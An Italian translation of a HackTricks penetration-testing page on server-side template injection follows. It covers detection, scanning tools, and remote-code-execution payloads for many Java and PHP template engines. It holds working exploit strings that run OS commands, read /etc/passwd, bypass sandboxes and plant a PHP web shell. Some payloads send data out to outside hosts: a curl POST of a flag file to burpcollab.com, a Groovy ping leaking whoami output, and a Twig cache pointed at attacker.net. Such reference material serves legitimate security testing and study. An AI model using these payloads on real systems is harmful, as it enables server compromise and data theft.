# SSTI (Server Side Template Injection)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) √® l'evento di sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro bollente per professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

## Cos'√® SSTI (Server-Side Template Injection)

L'iniezione di template lato server √® una vulnerabilit√† che si verifica quando un attaccante pu√≤ iniettare codice maligno in un template che viene eseguito sul server. Questa vulnerabilit√† pu√≤ essere trovata in diverse tecnologie, tra cui Jinja.

Jinja √® un popolare motore di template utilizzato nelle applicazioni web. Consideriamo un esempio che mostra un frammento di codice vulnerabile utilizzando Jinja:
```python
output = template.render(name=request.args.get('name'))
```
Nel seguente codice vulnerabile, il parametro `name` dalla richiesta dell'utente viene passato direttamente al template utilizzando la funzione `render`. Ci√≤ potrebbe potenzialmente consentire a un attaccante di iniettare codice maligno nel parametro `name`, causando una server-side template injection.

Ad esempio, un attaccante potrebbe creare una richiesta con un payload come questo:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Il payload `{{bad-stuff-here}}` viene iniettato nel parametro `name`. Questo payload pu√≤ contenere direttive del template Jinja che consentono all'attaccante di eseguire codice non autorizzato o manipolare il motore del template, ottenendo potenzialmente il controllo sul server.

Per prevenire le vulnerabilit√† di iniezione di template lato server, gli sviluppatori dovrebbero assicurarsi che l'input dell'utente venga correttamente sanificato e convalidato prima di essere inserito nei template. Implementare la convalida dell'input e utilizzare tecniche di escape consapevoli del contesto pu√≤ contribuire a mitigare il rischio di questa vulnerabilit√†.

### Rilevamento
Per rilevare l'iniezione di template lato server (SSTI), inizialmente, **fuzzare il template** √® un approccio diretto. Ci√≤ comporta l'iniezione di una sequenza di caratteri speciali (**`${{<%[%'"}}%\`**) nel template e l'analisi delle differenze nella risposta del server tra i dati regolari e questo payload speciale. Gli indicatori di vulnerabilit√† includono:
- Errori generati, che rivelano la vulnerabilit√† e potenzialmente il motore del template.
- Assenza del payload nella riflessione o parti mancanti, che implicano che il server lo elabora in modo diverso rispetto ai dati regolari.

- **Contesto in testo normale**: Distingui da XSS verificando se il server valuta le espressioni del template (ad esempio, `{{7*7}}`, `${7*7}`).

- **Contesto di codice**: Conferma la vulnerabilit√† modificando i parametri di input. Ad esempio, cambiare `greeting` in `http://vulnerable-website.com/?greeting=data.username` per vedere se l'output del server √® dinamico o fisso, come ad esempio `greeting=data.username}}hello` che restituisce il nome utente.

#### Fase di identificazione
L'identificazione del motore del template comporta l'analisi dei messaggi di errore o il test manuale di vari payload specifici del linguaggio. I payload comuni che causano errori includono `${7/0}`, `{{7/0}}` e `<%= 7/0 %>`. Osservare la risposta del server alle operazioni matematiche aiuta a individuare il motore del template specifico.

## Strumenti

### [TInjA](https://github.com/Hackmanit/TInjA)

uno scanner SSTI + CSTI efficiente che utilizza nuovi poliglotti
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap is a tool for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities in web applications. It is designed to automate the process of identifying and exploiting SSTI vulnerabilities, making it easier for penetration testers and security researchers to assess the security of web applications.

#### Features

- **Automatic detection**: SSTImap automatically scans web applications for SSTI vulnerabilities by injecting template code and analyzing the responses.
- **Exploitation**: Once a vulnerability is detected, SSTImap provides a simple interface for exploiting the vulnerability and executing arbitrary code on the server.
- **Payload customization**: SSTImap allows users to customize the payload used for exploitation, making it possible to target specific template engines and configurations.
- **Reporting**: SSTImap generates detailed reports that include information about the vulnerability, the exploited payload, and any data leaked from the server.

#### Usage

To use SSTImap, simply clone the repository from GitHub and install the required dependencies. Once installed, you can run the tool using the following command:

```
python sstimap.py -u <target_url>
```

Replace `<target_url>` with the URL of the web application you want to test for SSTI vulnerabilities.

#### Example

Here is an example of using SSTImap to test a web application for SSTI vulnerabilities:

```
python sstimap.py -u http://example.com
```

SSTImap will automatically scan the web application for SSTI vulnerabilities and provide a report with any detected vulnerabilities and any data leaked from the server.

#### Disclaimer

SSTImap is a powerful tool that can be used for both legitimate security testing and malicious purposes. It is important to obtain proper authorization before using SSTImap to test the security of any web application. The developers of SSTImap are not responsible for any misuse or damage caused by the tool.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap √® uno strumento di penetration testing che consente di individuare e sfruttare le vulnerabilit√† di injection di template lato server (Server-Side Template Injection, SSTI). Questo tipo di vulnerabilit√† si verifica quando un'applicazione web utilizza template lato server per generare dinamicamente il contenuto delle pagine web, ma non valida correttamente gli input degli utenti. Ci√≤ consente a un attaccante di eseguire codice arbitrario sul server.

Tplmap automatizza il processo di individuazione delle vulnerabilit√† SSTI, consentendo di testare rapidamente un'applicazione web per questa tipologia di vulnerabilit√†. Utilizzando una serie di payload predefiniti, Tplmap cerca di iniettare codice di template in vari punti dell'applicazione, come ad esempio i parametri delle richieste HTTP o i campi dei form. In questo modo, √® possibile determinare se l'applicazione √® vulnerabile a SSTI e, in caso affermativo, sfruttare la vulnerabilit√† per ottenere l'esecuzione di codice arbitrario sul server.

Tplmap supporta diversi motori di template, come ad esempio Jinja2, Mako, Smarty e molti altri. Inoltre, offre funzionalit√† avanzate come la possibilit√† di specificare un payload personalizzato, l'interazione con il server tramite una shell interattiva e la possibilit√† di eseguire comandi remoti.

Tplmap √® uno strumento molto potente per i penetration tester che desiderano identificare e sfruttare le vulnerabilit√† SSTI nelle applicazioni web. Tuttavia, √® importante utilizzarlo solo per scopi legittimi e con il consenso del proprietario dell'applicazione. L'utilizzo di Tplmap per scopi illegali √® un reato e pu√≤ comportare conseguenze legali.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Tabella di Injection dei Template](https://github.com/Hackmanit/template-injection-table)

una tabella interattiva contenente i polyglot di injection dei template pi√π efficienti insieme alle risposte attese dei 44 motori di template pi√π importanti.

## Exploit

### Generico

In questa **wordlist** puoi trovare le **variabili definite** negli ambienti di alcuni dei motori menzionati di seguito:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Iniezione di base**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Recuperare le variabili d'ambiente del sistema**

In Java, √® possibile recuperare le variabili d'ambiente del sistema utilizzando la classe `System` e il metodo `getenv()`. Questo metodo restituisce una mappa delle variabili d'ambiente, in cui le chiavi sono i nomi delle variabili e i valori sono i rispettivi valori delle variabili.

Ecco un esempio di come utilizzare il metodo `getenv()` per recuperare le variabili d'ambiente del sistema:

```java
import java.util.Map;

public class EnvironmentVariablesExample {
    public static void main(String[] args) {
        // Recupera le variabili d'ambiente del sistema
        Map<String, String> envVariables = System.getenv();

        // Stampa le variabili d'ambiente
        for (Map.Entry<String, String> entry : envVariables.entrySet()) {
            System.out.println(entry.getKey() + " = " + entry.getValue());
        }
    }
}
```

Questo codice stampa tutte le variabili d'ambiente del sistema, insieme ai loro valori, sulla console di output.
```java
${T(java.lang.System).getenv()}
```
**Java - Recupera /etc/passwd**

Le Server-Side Template Injection (SSTI) √® una vulnerabilit√† che si verifica quando un'applicazione web permette l'esecuzione di codice lato server all'interno dei template. Questo pu√≤ consentire a un attaccante di eseguire codice arbitrario sul server e ottenere accesso non autorizzato a risorse sensibili.

In Java, √® possibile sfruttare una SSTI per recuperare il file /etc/passwd, che contiene le informazioni sugli utenti del sistema. Di seguito √® riportato un esempio di codice che dimostra come farlo:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SSTIExample {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

In questo esempio, viene utilizzato il comando "cat /etc/passwd" per leggere il contenuto del file /etc/passwd. Il risultato viene quindi stampato sulla console.

√à importante notare che l'esecuzione di codice arbitrario sul server √® un'attivit√† illegale e pu√≤ comportare conseguenze legali. Questo esempio √® fornito solo a scopo educativo per comprendere le vulnerabilit√† SSTI e come possono essere sfruttate.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Puoi provare i tuoi payload su [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Bypass del Sandbox**

‚ö†Ô∏è funziona solo su versioni di Freemarker inferiori a 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Ulteriori informazioni**

* Nella sezione FreeMarker di [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Ulteriori informazioni**

* Nella sezione Velocity di [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

In Thymeleaf, un test comune per le vulnerabilit√† SSTI √® l'espressione `${7*7}`, che si applica anche a questo motore di template. Per potenziali esecuzioni di codice remoto, possono essere utilizzate espressioni come le seguenti:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf richiede che queste espressioni siano inserite all'interno di attributi specifici. Tuttavia, il _inline delle espressioni_ √® supportato per altre posizioni dei template, utilizzando la sintassi come `[[...]]` o `[(...)]`. Pertanto, un semplice payload di test SSTI potrebbe apparire come `[[${7*7}]]`.

Tuttavia, la probabilit√† che questo payload funzioni √® generalmente bassa. La configurazione predefinita di Thymeleaf non supporta la generazione dinamica dei template; i template devono essere predefiniti. Gli sviluppatori dovrebbero implementare il proprio `TemplateResolver` per creare template da stringhe al volo, il che √® raro.

Thymeleaf offre anche la _pre-elaborazione delle espressioni_, in cui le espressioni all'interno di doppi trattini bassi (`__...__`) vengono pre-elaborate. Questa funzionalit√† pu√≤ essere utilizzata nella costruzione delle espressioni, come dimostrato nella documentazione di Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Esempio di Vulnerabilit√† in Thymeleaf**

Considera il seguente frammento di codice, che potrebbe essere suscettibile a sfruttamento:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Questo indica che se il motore del template elabora in modo improprio questi input, potrebbe portare all'esecuzione remota del codice accedendo agli URL come:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Ulteriori informazioni**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Bypassare i filtri**

√à possibile utilizzare pi√π espressioni di variabili, se `${...}` non funziona, prova con `#{...}`, `*{...}`, `@{...}` o `~{...}`.

* Leggi `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personalizzato per la generazione del payload
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Ulteriori informazioni**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipolazione della vista di Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Vecchia versione di Pebble ( < versione 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nuova versione di Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava √® un motore di template Java che supporta l'iniezione di template lato server (SSTI). √à basato su Jinja, un popolare motore di template per Python.

#### Rilevamento

Per rilevare un'eventuale vulnerabilit√† di SSTI in un'applicazione che utilizza Jinjava, √® possibile cercare segni di iniezione di template nelle pagine web. Questi segni possono includere l'uso di delimitatori di template come `{{` e `}}`, o l'uso di variabili non sanificate all'interno dei template.

#### Sfruttamento

Per sfruttare una vulnerabilit√† di SSTI in Jinjava, √® possibile utilizzare del codice Java all'interno dei delimitatori di template per eseguire comandi sul server. Ad esempio, √® possibile eseguire comandi di sistema utilizzando la classe `java.lang.Runtime`.

Ecco un esempio di payload che esegue il comando `ls` sul server:

```
{{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ls')}}
```

#### Prevenzione

Per prevenire le vulnerabilit√† di SSTI in Jinjava, √® importante sanificare correttamente le variabili utilizzate nei template. Assicurarsi di validare e filtrare i dati in ingresso per evitare l'esecuzione di codice non autorizzato.

Inoltre, √® consigliabile utilizzare una versione aggiornata di Jinjava, in quanto potrebbero essere state apportate correzioni di sicurezza nelle versioni pi√π recenti.

#### Riferimenti

- [Documentazione ufficiale di Jinjava](https://github.com/HubSpot/jinjava)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava √® un progetto open source sviluppato da Hubspot, disponibile su [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Esecuzione di comandi**

Risolto da [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Ulteriori informazioni**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` delimitatori di istruzioni
* `{{ }}` delimitatori di espressioni
* `{# #}` delimitatori di commenti
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Cerca "com.hubspot.content.hubl.context.TemplateContextRequest" e scopri il [progetto Jinjava su Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Ulteriori informazioni**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Expression Language (EL) √® una funzionalit√† fondamentale che facilita l'interazione tra il livello di presentazione (come le pagine web) e la logica dell'applicazione (come i managed bean) in JavaEE. Viene ampiamente utilizzato in diverse tecnologie JavaEE per semplificare questa comunicazione. Le principali tecnologie JavaEE che utilizzano EL includono:

- **JavaServer Faces (JSF)**: Utilizza EL per collegare i componenti nelle pagine JSF ai dati e alle azioni di backend corrispondenti.
- **JavaServer Pages (JSP)**: EL viene utilizzato in JSP per accedere e manipolare i dati all'interno delle pagine JSP, facilitando il collegamento degli elementi della pagina ai dati dell'applicazione.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL si integra con CDI per consentire un'interazione senza soluzione di continuit√† tra il livello web e i managed bean, garantendo una struttura dell'applicazione pi√π coerente.

Consulta la seguente pagina per saperne di pi√π sull'**exploit degli interpreti EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

I seguenti bypass del Security Manager sono stati presi da questo [**articolo**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √® l'evento di sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Ulteriori informazioni**

* Nella sezione Smarty di [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Errore`
* `{{foobar}} Nulla`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Formato del template**

Twig √® un motore di template flessibile e sicuro per PHP. √à ampiamente utilizzato per creare template in vari framework PHP, come Symfony e Laravel.

I template Twig sono scritti in un formato leggibile e intuitivo, che facilita la creazione e la gestione dei template. I template Twig utilizzano una sintassi simile a quella di HTML, ma con alcune aggiunte e modifiche per rendere il processo di rendering dei template pi√π potente e sicuro.

I template Twig possono contenere variabili, filtri, blocchi, cicli e condizioni. Le variabili vengono utilizzate per inserire dinamicamente i dati nel template, mentre i filtri consentono di manipolare i dati prima di visualizzarli. I blocchi consentono di definire sezioni riutilizzabili nel template, mentre i cicli e le condizioni consentono di eseguire operazioni ripetute o condizionali nel template.

Twig offre anche funzionalit√† avanzate come l'ereditariet√† dei template, che consente di creare template base che possono essere estesi e personalizzati da altri template. Questo rende la gestione dei template pi√π modulare e riduce la duplicazione del codice.

